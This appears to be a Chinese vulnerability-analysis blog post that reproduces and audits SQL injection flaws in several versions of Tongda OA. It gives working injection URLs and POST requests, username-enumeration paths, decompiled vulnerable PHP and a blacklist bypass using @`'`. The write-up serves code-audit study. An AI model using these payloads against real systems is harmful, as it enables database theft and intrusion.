<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6ajtYnyBSzcZrATQp_0i5A)

![](http://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFCs8icVFGZRRTYQskvAMmupOyFnuYBXHJFTtGSXROq6agKia7u0MIMCdVlY2MicMotIuWn6yw9vUZZNw/0?wx_fmt=png)广软 NSDA 安全团队推荐搜索关键词列表：漏洞分析代码审计漏洞复现 OA

**文章初发布于先知社区：https://xz.aliyun.com/t/10726**  

-----------------------------------------------

**作者：ajie**

**(这是写完这篇文章之后在这里补充的，我觉得，如果真的感兴趣，一定要看看 2017 那个 SQL 注入，简简单单的一个 @和 ```'` ``，里面是真的细，惊到我了)**  

(一) 前言
------

通达 OA（Office Anywhere 网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。这里感谢 **jdr 师傅**前面整理的通达 OA 一些版本的漏洞复现，这里从漏洞点出发，分析漏洞，从中学些一些师傅白盒挖掘漏洞的思路。

安装包下载地址从网上的文章发现基本有 2 种，可以通过枚举版本号下载对应的安装包：

```
https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe
https://www.tongda2000.com/download/down.php?VERSION=2019&code=
```

也可以从我整理好的百度网盘下载：

```
链接: https://pan.baidu.com/s/16Ie3yegEjdb--jabA0Zsxg 提取码: 4g6i
```

安装教程为傻瓜式一键安装，这里不细说。默认账号密码 admin/(空)![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ3oo5gl0CrTFUjnwCD6G7CQZsSAK6EpP2x08omuqsD0Vz1HuQlU8jTQ/640?wx_fmt=png) 代码解密使用在线工具：http://dezend.qiling.org/free/

(二) 信息收集
--------

### 一、版本信息

```
/inc/expired.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZt45GHyJJOm3aUiapQ4yicRKM6HJ0eib2iacMBdw0kZtnPiadRibX7oqrqcag/640?wx_fmt=png)

```
/inc/reg_trial.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZaoVRCL7oKbTzFQzZa02Jic1soYJWZQbjyWKsoPUXN6ibjEtGpGNtKa6A/640?wx_fmt=png)

```
/inc/reg_trial_submit.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ9HqblSpcp6op35arwzRoiaHhIxuuCOVbnjrcalo06GcwUgRDW8P48tw/640?wx_fmt=png)

### 二、计算机名

需要高于 2013 版本

```
/resque/worker.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZiaDK6icFZPxLql7sKEOIOwnzPbpeyTicpEIAE4wKgtrA4LQQLBru34XCA/640?wx_fmt=png)

### 三、用户名 & 邮箱枚举

需要高于 2013 版本

```
/ispirit/retrieve_pwd.php?username=要枚举的用户
```

存在的用户![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ3dBV82YgtlqVIlZxDrvSGrdazxiaW3WBtfuDqquG347vRZdJxlKzZrQ/640?wx_fmt=png)不存在的用户![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZzfGQJeW9ZZAicV2baAak2J30aQ4qN4QI2Rr1mIzwgxiaPJZvXJgia2cOA/640?wx_fmt=png)

(三) 通达 OA2013
-------------

### 一、/interface/ugo.php 报错注入

#### 漏洞复现

```
/interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20database()),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ7Or3ppxN9NEr0jfb1viaBCjlTbq41HtsLicrbJj4x66jNbzCsskMiafhA/640?wx_fmt=png)

#### 漏洞分析

1、首先定位到漏洞点 / interface/ugo.php 使用函数 urldecode 解析 $OA_USER，这也是为什么单引号使用 **%2527** 的原因然后下面调用 ext_login_check 方法处理 $OA_USER![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZgKk0n8zTn6BWROAYp7DxTXf43OWgVuf7Zgia49kujM6UALBBjvzna9A/640?wx_fmt=png)2、全局搜索 ext_login_check，在第 16、17 行看到直接拼接并调用方法 exequery 执行![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ9ia4fzT9fZdCJzXiciaZ5VPtT4Q260vjpA3e1qLVkiaJHdiaOoAM1tEHJrQ/640?wx_fmt=png) 3、exequery 方法是这样定位的：首先 ugo.php 包含了 inc/session.php 文件![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZwcA1LhHkaia9tBVdDmC0BvWBibDVr21CTuXmf9rvsQa3yKpjHsYw7GUg/640?wx_fmt=png) session.php 文件包含了 inc/conn.php 文件![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZZgG6TxfJicng12SXVKnJ52h0gT2BUzOWGEXaWMMT86bKyvEwLrCiaz9w/640?wx_fmt=png)在 conn.php 文件中就看到了 exequery 方法![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ4YuDwgicicibNXAobw29Sib4iadC35rdDXSpKLvIQPByFt1pVqOnS70ldQA/640?wx_fmt=png) 4、前面简单处理了 union select 和 info outfile 和 into dumpfile

```
if (!$LOG) {
        $POS = stripos($Q, "union");
        if ($POS !== FALSE && stripos($Q, "select", $POS) !== FALSE) {
            exit;
        }
        $POS = stripos($Q, "into");
        if ($POS !== FALSE && (stripos($Q, "outfile", $POS) !== FALSE || stripos($Q, "dumpfile", $POS) !== FALSE)) {
            exit;
        }
    }
```

5、在这里执行了 sql 语句![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZuT8RmyNp7LOdBRVM6lJrB0vsjS2yEs7FL1EyZYUMRpv42artr9xkNA/640?wx_fmt=png)

### 二、/interface/auth.php 报错注入

#### 漏洞复现 

这个复现是 jdr 师傅之前复现的，现在因为没有搞到更老版本的安装包，就直接用了，思路还是比较简单的。

```
/interface/auth.php?&PASSWORD=1&USER_ID=%df%27 and (select 1 from (select count(*),concat((select concat(0x3a,(select database()) ,0x3a) from user limit 1),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZcqAyttDudEHwou7FcET6l8gURWpBJFKPWPibIOfERsjibZjUubia9aSZg/640?wx_fmt=png)

#### 漏洞分析

1、根据 URL 定位漏洞点 / interface/auth.php![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZkO2T1rGUWuH68AHbDicSa14vpHI0814zeMg8mVDV6JDqBbCJvO5vUCg/640?wx_fmt=png)2、关键代码截取下来了，很明显这里加了过滤，将一些字符替换为空，所以无法利用。

```
//替换为空
$USER_ID = str_replace(array(",", "\\\"", "\\'", "\"", "'", "\t", "\\", "\\\\"), array("", "", "", "", "", "", "", ""), $USER_ID);
//检测传参是否非空，空的话exit
if ($USER_ID == "" || $PASSWORD == "") {
    message("", _("»¥Áª»¥Í¨·ÃÎÊ½Ó¿ÚµÄÓÃ»§Ãû»òÃÜÂëÓÐÎó"));
    exit;
}
//直接拼接USER_ID
$query = "select * from EXT_USER where USER_ID='" . $USER_ID . "'";
//调用exequery执行
$cursor = exequery($connection, $query);
```

### 三、/interface/go.php 报错注入

#### 漏洞复现

emm。。同上，我这里已经无法复现了

```
interface/go.php?APP_UNIT=a%2527 and 1=(select 1 from(select count(*),concat(database(),0x7c,user(),0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a) and %25271%2527=%25271
```

 ![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZJ0dwicGdLInWSfNw3aPYGun9wGRVwKpNn7vvAqcLJLjtuibykB4iaef5g/640?wx_fmt=png)

#### 漏洞分析

1、根据 URL 定位漏洞点 / interface/go.php![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZRY5ekzYCEnujaicbibLnf1T7jqkTeniajacFlPo7M6YDnFtQ39YJtW0gQ/640?wx_fmt=png)2、OA_USER 和 APP_UNIT 都进行了过滤

```
//过滤单引号等字符，替换为空
$OA_USER = str_replace(array(",", "\\\"", "\\'", "\"", "'", "\t", "\\", "\\\\"), array("", "", "", "", "", "", "", ""), $OA_USER);
$APP_UNIT = str_replace(array(",", "\\\"", "\\'", "\"", "'", "\t", "\\", "\\\\"), array("", "", "", "", "", "", "", ""), $APP_UNIT);
//直接拼接APP_UNIT
$query = "select MEMBER_ID from CONNECT_CONFIG where MEMBER_;
//调用exequery方法执行
$cursor = exequery($connection, $query);
```

3、jdr 师傅是复现了 APP_UNIT 参数的 SQL 注入，然后这里往下看，可以看到 OA_USER 与 / interface/ugo.php 中的一样，在下面调用了 ext_login_check 方法

```
if ($OA_USER == "admin") {
    echo _("¸ÃÕÊºÅÎÞÈ¨·ÃÎÊ");
    exit;
}
session_start();
ob_start();
if ($LOGIN_USER_ID != $OA_USER) {
    include_once "./auth.php";
    $result = ext_login_check($OA_USER);
    if ($result != "1") {
        echo $result;
        exit;
    }
}
```

而 ext_login_check 方法是没有过滤的，所以，理论上，旧版本在 / interface/go.php?OA_USER = 应该也会有注入。![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZlfVUFabia39bd3td4mPmkXqYibbZt3BqIYlFIWBsXbRVFeTYiaJuDZ74g/640?wx_fmt=png)

(四) 通达 OA2015
-------------

### 一、/ispirit/retrieve_pwd.php 盲注

#### 漏洞复现 

1、判断是否存在注入

```
/ispirit/retrieve_pwd.php?_GET[username]=admin'or 1=1 and'a'='a
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZibgNbCLbfywVkQM9bUBspykuZ9dtEibD9E6Y9OTM1piaiaQaiaEuqG4gqtQ/640?wx_fmt=png)2、判断数据库长度为 5

```
/ispirit/retrieve_pwd.php?_GET[username]=admin' or if((length(database())=5),1,power(88888,88)) and'a'='a
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZU1sSxns7M6VoWSnIWRphOC11NeQoh5k1vA3QnUQ437gEfyyb8FUK0w/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZcgOBee3LlQicXK4JB9Pmg5gl1PmgCNTla7WMUJW8Piar1QFmfASAicCBg/640?wx_fmt=png)3、判断数据库是否为 td_oa

```
/ispirit/retrieve_pwd.php?_GET[username]=admin'or if((database()='td_oa'),1,power(888888,88))and'a'='a
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZhiaNwKQiaKWperCzzhFILBhyI9YWbW6uSgQzB7NBBdicmwxwHfMATIG4A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ9tInQkjW4u6HjpG5zLicYvgIWcXrQV2Uk4yHicwtPgwSYILJbzKy6q9w/640?wx_fmt=png)

#### 漏洞分析

这里代码没找到旧版本的，就理性分析一下。1、根据 URL 定位漏洞点 / ispirit/retrieve_pwd.php![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZb3j94VAibZDSsvRPzDOBaeIA7wHkXMAXoTEWjhIicD0icsWr2RiaZudlmg/640?wx_fmt=png)2、前面看到请求了 2 个参数 username 和 email，然后 username 直接拼接

```
<?php
include_once "inc/conn.php";
include_once "inc/utility_all.php";
//get请求
$username = $_GET["username"];
$email = $_GET["email"];
//直接拼接username
$query = "SELECT UID,USER_ID,USER_NAME,USEING_KEY FROM USER WHERE BYNAME='{$username}'";
//调用exequery执行
$cursor = exequery(TD::conn(), $query);
```

3、定位 exequery 方法，在 inc/conn.php 中![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ4Iqgib4ER7tQibWfmDcAGic1C2cMehYwibyRZjzeVze3zecbEZGCSNq89A/640?wx_fmt=png) 4、首先看 exequery 方法，调用了 db_query 方法

```
function exequery($C, $Q, $QUERY_MASTER = false, $LOG = true)
{
    $cursor = @db_query($Q, $C, $QUERY_MASTER);
    if (!$cursor) {
        printerror("<b>" . _("SQLÓï¾ä:") . "</b> " . $Q, $LOG);
    }
    return $cursor;
}
```

5、然后看 db_query 方法，第一行就调用 sql_injection 进行了检测是否存在 SQL 注入。往下可以看到还有一些其他检测如 select 和 set 的，这里推测应该是在一定基础上进行了一次绕过，然后就直接加了 sql_injection 方法在前面。

```
function db_query($Q, $C, $QUERY_MASTER = false)
{
    sql_injection($Q, "'");
    if (MYOA_DB_USE_REPLICATION && ($QUERY_MASTER || strtolower(substr(ltrim($Q), 0, 6)) != "select" && strtolower(substr(ltrim($Q), 0, 3)) != "set")) {
        if ($C == TD::$_res_conn && $C != TD::$_res_conn_master) {
            if (!is_resource(TD::$_res_conn_master)) {
                TD::$_res_conn_master = openconnection(TD::$_arr_db_master, TD::$_arr_db_master["db"]);
            }
            $C = TD::$_res_conn_master;
        } else {
            if ($C == TD::$_res_conn_crscell && $C != TD::$_res_conn_crscell_master) {
                if (!is_resource(TD::$_res_conn_crscell_master)) {
                    TD::$_res_conn_crscell_master = openconnection(TD::$_arr_db_master, TD::$_arr_db_master["db_crscell"]);
                }
                $C = TD::$_res_conn_crscell_master;
            }
        }
    }
    return @mysql_query($Q, $C);
}
```

6、跟进到 sql_injection 方法，代码有点长，其实就是进行了黑名单校验。![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZA5BDWN8W9hzVeqyx0rhibSQ4eoYschudk24GYiaADpsZUkpmKCoFOOCg/640?wx_fmt=png)  

```
$clean = trim(strtolower(preg_replace(array("~\\s+~s"), array(" "), $clean)));
if (strpos($clean, "union") !== false && preg_match("~(^|[^a-z])union(\$|[^[a-z])~s", $clean) != 0) {
if (2 < strpos($clean, "/*") || strpos($clean, "--") !== false || strpos($clean, "#") !== false) {
if (strpos($clean, "sleep") !== false && preg_match("~(^|[^a-z])sleep(\$|[^[a-z])~s", $clean) != 0) {
if (strpos($clean, "benchmark") !== false && preg_match("~(^|[^a-z])benchmark(\$|[^[a-z])~s", $clean) != 0) {
if (strpos($clean, "load_file") !== false && preg_match("~(^|[^a-z])load_file(\$|[^[a-z])~s", $clean) != 0) {
if (strpos($clean, "cast") !== false && preg_match("~(^|[^a-z])mid(\$|[^[a-z])~s", $clean) != 0) {
if (strpos($clean, "ord") !== false && preg_match("~(^|[^a-z])ord(\$|[^[a-z])~s", $clean) != 0) {
if (strpos($clean, "ascii") !== false && preg_match("~(^|[^a-z])ascii(\$|[^[a-z])~s", $clean) != 0) {
if (strpos($clean, "extractvalue") !== false && preg_match("~(^|[^a-z])extractvalue(\$|[^[a-z])~s", $clean) != 0) {
if (strpos($clean, "updatexml") !== false && preg_match("~(^|[^a-z])updatexml(\$|[^[a-z])~s", $clean) != 0) {
if (strpos($clean, "into outfile") !== false && preg_match("~(^|[^a-z])into\\s+outfile(\$|[^[a-z])~s", $clean) != 0) {
if (strpos($clean, "exp") !== false && preg_match("~(^|[^a-z])exp(\$|[^[a-z])~s", $clean) != 0) {
if (stripos($db_string, "update") !== false && stripos($db_string, "user") !== false && stripos($db_string, "set") !== false && stripos($db_string, "file_priv") !== false) {
```

(五) 通达 OA2017
-------------

### 一、/general/document/index.php/setting/keywords/index 布尔盲注

#### 漏洞复现

数据包如下：

```
POST /general/document/index.php/setting/keywords/index HTTP/1.1
Host: 10.211.55.3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=gdtugivsnejrt9l9um0v48dou7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=429762af; UI_COOKIE=0; LOGIN_LANG=cn
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

_SERVER[QUERY_STRING]=kname=1'+and@`'`+or+if(substr(user(),1,1)='r',1,exp(710))#
```

1、当数据库用户名第一个为 r 时，页面返回正常![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZusibspAhFoPZcHDPz1RaNVfib7AvmhRtVic6OpetH9rzsGFibhibql0NNOw/640?wx_fmt=png) 2、用户名前 4 位，不为 rooq，页面报错![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZib32AVXKessgxbzMhHczpfKYeIuj7UXkBuVwRJdiatPSPjib5cjSzdmUw/640?wx_fmt=png)为 root 时页面正常![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZvcSJExQm2QxQzNrEicliatXtlalaxqQYFCXicdzcupnKibibnls6ps8YnUw/640?wx_fmt=png)  

#### 漏洞分析

1、根据请求定位漏洞点 general/document/index.php![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZsxuR3WwiarC6F0xrp4Lv2PXyHhmVTRibQYoRcicyZmkZcibibPibEwAWRmxg/640?wx_fmt=png)2、这里很明显，开始引用框架了，大概看出来是在 \ webroot\inc\td_framework\core\Framework.php 文件中简单理解一下其实跟 tp 框架差不多，就是 controllers / 文件 / 方法这样的。![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ9pyZ4pCCM3zrbfP6Tk2FIMfFw0m24xJQWRCAy6D0yYNd0xiaiayum9og/640?wx_fmt=png)3、因为 payload 路径为 / general/document/index.php/setting/keywords/index，所以定位到文件：\webroot\general\document\controllers\setting\keywords.php 的 index 方法。![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZETwNQcNdDia61eXXNPoUD6LK7qzLIu0icHmlITrXSGGoSuhBSwlkUy7A/640?wx_fmt=png)4、查看分别是设置了 config 数组和 data 数组的值，其中第二行调用了**_get_where** 方法

```
public function index()
{
        $this->load->helper('td_doc');
        $where = $this->_get_where();
        $config['base_url'] = site_url('setting/keywords/index') . '?kname=' . $this->kname . '&category=' . $this->category;
        $config['total_rows'] = $this->mkeyword->get_keywords_count($where);
        $config['per_page'] = '6';
        $config['uri_segment'] = 4;
        $data['search_url'] = site_url('setting/keywords');
        $data['pages'] = $this->_pagination($config, $where);
        $data['keywords'] = $this->mkeyword->get_keywords($where, $this->uri->segment(4, 0), $config['per_page']);
        $data['kname'] = $this->kname;
        $data['category'] = $this->category;
        $data['category_list'] = get_syscode_list('DOC_CATEGORY');
        $this->load->view('setting/keywords', $data);
    }
```

5、往前看，分析_get_where 方法

```
public function _get_where()
{
      //首先将$_SERVER['QUERY_STRING']参数值变成变量
        parse_str($_SERVER['QUERY_STRING'], $_GET);
        //因为已经传了kname，所以跳过
        if (isset($_GET['kname'])) {
            $this->kname = $_GET['kname'];
        }
        //不传参，也先不看
        if (isset($_GET['category'])) {
            $this->category = $_GET['category'];
        }
        $where = '';
        //将kname的值拼接到$where中
        if ($this->kname) {
            $where = ' and kname like \'%' . $this->kname . '%\'';
        }
        //将category的值拼接到$where中
        if ($this->category) {
            $where .= ' and category=\'' . $this->category . '\'';
        }
        return $where;
    }
```

6、可以看到这里就是漏洞点了，直接拼接传参到 where 中，那么回到 index 方法，注意这一段

```
$config['total_rows'] = $this->mkeyword->get_keywords_count($where);
```

调用了 mkeyword 的 get_keywords_count 方法，传参为拼接的 $where 在文件最前面可以看到 mkeyword 为加载的 model![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZAUxicYf991053iavhLkJ1rlqdewS1V1o3OxwiajzAzg2vk8bQ0hsPry2Q/640?wx_fmt=png)7、定位到 \ webroot\general\document\models\mkeyword.php 的 get_keywords_count 方法![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZFrjB7xW57zPiaeibpcCaEicInHBUq2rdzE7ErMunVILkicVwecfgOuLGrg/640?wx_fmt=png) 8、代码如下，直接将传过来的 $where 拼接到 sql 语句中进行执行

```
public function get_keywords_count($where)
{
        $sql = 'select count(*) as total from doc_keywords where 1=1' . $where;
        $query = $this->db->query($sql, false, true, true);
        return $query->row()->total;
    }
```

9、然后，这里我就卡住了，因为解密文件的不顺利，我不能直接通过 PHPstorm 打开跳转找到 query 方法，于是我冥思苦想，找了好多文件，之后，回到代码中，这里是 **$this->db->query**，那么是不是就是 db 这个 class 中的 query 方法呢。我回去看了 Framework.php，其中有这样一个配置，db 指向了 database![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZhHRicZk8V2M0t0jkwq8sicAdfu2UU4UnBGDhic7f4gGbyiaUUU5PY2xxUw/640?wx_fmt=png)10、于是我在框架所在的目录下的 libraris 目录下，发现了 database.php，在 169 行，成功发现了 query 方法![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ2qdmgBmDHiagicBpyibDHia1ssBZmfzrHOflcZchCWV0cf2dC1PLbAfyibQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZVPr5sNMcVcoZicftVxNpDpec2a623sLPmc4DicVODWVBN1iauv5yucOWA/640?wx_fmt=png) 11、前面一段检测了 select，进行了一些赋值

```
public function query($sql, $binds = false, $return_object = true, $QUERY_MASTER = false)
{  //截取字符串是不是为select
    if (MYOA_DB_USE_REPLICATION && ($QUERY_MASTER || ((strtolower(substr(ltrim($sql), 0, 6)) != 'select') && (strtolower(substr(ltrim($sql), 0, 3)) != 'set')))) {
      if (!is_resource($this->master_conn_id)) {
        $this->tomasterdb();
      }

      $this->conn_id = $this->master_conn_id;
    }
    else if (is_resource($this->slave_conn_id)) {
      $this->conn_id = $this->slave_conn_id;
    }
    //$binds为false
    if ($binds !== false) {
      $sql = $this->compile_binds($sql, $binds);
    }
    //全局搜索save_queries，为true，将sql赋值到queries数组中
    if ($this->save_queries == true) {
      $this->queries[] = $sql;
    }

    $time_start = list($sm, $ss) = explode(' ', microtime());
```

12、往下看

```
//这里先调用方法_execute处理$sql
if (false === $this->result_id = $this->_execute($sql)) {
      if ($this->save_queries == true) {
        $this->query_times[] = 0;
      }

      $this->display_error();
      return false;
    }

    $time_end = list($em, $es) = explode(' ', microtime());
    $this->benchmark += ($em + $es) - ($sm + $ss);

    if ($this->save_queries == true) {
      $this->query_times[] = ($em + $es) - ($sm + $ss);
    }

    ->query_count++;

    if ($return_object !== true) {
      return true;
    }
    //这里是最后的返回值，创建了一个TD_Database_result对象
    $RES = new TD_Database_result();
    $RES->conn_id = $this->conn_id;
    $RES->result_id = $this->result_id;
    return $RES;
```

13、查看 _execute 方法，调用了_ prep_query 方法处理字符串，然后调用 db_query 执行![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZREeYbpo9hfwml6jerVnOPyo8JWT10dF6R77hsrQ2x5dlxHG9bj0Jvg/640?wx_fmt=png) 14、_prep_query 方法进行了一些 delete 的过滤![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZWkmZ5ZzrpFFjoDic8GMUd1JFmgAyUsaiaF7agOGXCPMTAceHAiahwFq1Q/640?wx_fmt=png) 15、db_query 方法以我多年的经验，很快找到是在 / inc/conn.php 文件中，这里跟前面 2015 的一样了，sql_injection 基本过滤了注入需要的函数![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZO8BRIZqpKxKAYYRUZjHx2od0wDOhriaVIlicWn5pEa8D11sjI9DJygPw/640?wx_fmt=png) 16、回到前面的 keyword.php，因为原复现的时候，是通过传参 kname 进行注入的，但是实际上我们发现还有一个 category 也好像没有任何过滤进行了执行，尝试之后发现，果然也存在![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZicjRYZJwAx422XD4KqVhCYWbvSwiacJL7KMWquwwdwSc2v7DnUaTRqaQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZiaFor2RZoZdVCJhJ0drafLSS6sqaibU4JJKTercUichHjAxlOkE3nydZA/640?wx_fmt=png)数据包如下：

```
POST /general/document/index.php/setting/keywords HTTP/1.1
Host: 10.211.55.3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Origin: http://10.211.55.3
Connection: close
Referer: http://10.211.55.3/general/document/index.php/setting/keywords
Cookie: PHPSESSID=gdtugivsnejrt9l9um0v48dou7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=429762af; UI_COOKIE=0; LOGIN_LANG=cn
Upgrade-Insecure-Requests: 1

_SERVER%5BQUERY_STRING%5D=category%3D1%27%2Band%40%60%27%60%2Bor%2Bif%28substr%28user%28%29%2C1%2C4%29%3D%27root%27%2C1%2Cexp%28710%29%29%23
```

17、可能这就是分析漏洞的快乐吧，突然就发现了其他类似的接口同样存在漏洞。当然因为是 sql 注入，也想看看具体执行了什么语句，这里使用 jdr 师傅自己写的 mysql 监控工具监控 mysql 信息工具

下载地址：https://github.com/jdr2021/MysqlLogQuery

数据库连接信息可以在这里看到![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZz6g9WUIVaiaCQvCibGU7ARBWdv03StFIsaZ2STAFjrBDaEwvW2Ww8KTg/640?wx_fmt=png)监控后执行，可以看到完整的 sql 语句

```
select count(*) as total from doc_keywords where 1=1 and category='1' and@`'` or if(substr(user(),1,4)='root',1,exp(710))#'
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZCJaRzddufMAG9ZUiaJazG1HewXzLOHxlUJfpaibCooIaTo8wqPMiaE5XQ/640?wx_fmt=png)18、然后，我就好奇了为什么需要在里面加上

```
@`'`
```

19、尝试 fuzz 一下，发现，如果没有多一个单引号，关键字会被检测出来

```
_SERVER[QUERY_STRING]=category=1'+and@``+or+if(substr(user(),1,4)='root',1,exp(710))#
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZ2MrMczeCcHQQ15Fy4HheEjhxBssY1iaYl9CZwibClWIJuFt5p2R7ayQw/640?wx_fmt=png)如果没有 @，那么语句就会报错

```
_SERVER[QUERY_STRING]=category=1'+and`'`+or+if(substr(user(),1,4)='root',1,exp(710))#
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZBKtLqzZKNz39urtpJohMDcFCbvYAqlxXiaqvlnJianC6FuicQxuZKcFHQ/640?wx_fmt=png)20、这里就很明显发现了大佬们 bypass 的一个思路，首先通过单引号跳过了检测的代码，然后又通过 @和反引号，使后面的语句成功执行。我将 sql 语句放到数据库中执行，发现不会报错![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZURqrEw5ibSXzZauqLne49EH7FMu7ol3c6BaP6hUqVSoMAlA3Ed9Yw9Q/640?wx_fmt=png)但是如果删掉 @，就报错了，因为多了个单引号![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZd8evlpvwhqzQRImx6YeGdnumLnica3o2huhb6PficFo6prZLqdMKmIJw/640?wx_fmt=png) 21、通过查阅资料我了解到了，mysql 中的 @表示设置一个变量，而 `` 反引号则是转义符，这里是通过设置一个反引号的变量来绕过过滤。真的觉得太强了。真的觉得太强了。回到过滤的 sql_injection 方法，可以看到就是这里导致了存在绕过![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZqkSZouIiawgT669VOuHjLxd6ibY9giclpjSPFa2ach9ZvNDVAzZ7fM6zA/640?wx_fmt=png) 